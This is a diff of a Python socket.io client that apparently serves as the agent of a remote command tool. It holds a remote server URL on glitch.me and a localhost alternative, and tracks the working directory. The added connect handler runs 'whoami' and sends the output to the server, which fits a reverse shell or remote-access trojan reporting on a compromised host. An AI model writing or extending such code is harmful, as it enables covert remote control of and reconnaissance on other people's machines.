@@ -5,13 +5,19 @@ import os
 sio = socketio.Client()
 on = 'http://raveneye.glitch.me/'
 off = 'http://localhost:3000/'
-url = on
+url = off
 class Session:
     def __init__(self):
         self.current_directory = os.getcwd()
         self.exit_requested = False
 
 session = Session()
+
+@sio.on('connect')
+def on_connect():
+    global session
+    whoami_output = execute_command('whoami')
+    sio.emit('intro', whoami_output[:-1])
 
 @sio.on('message')
 def on_message(msg):
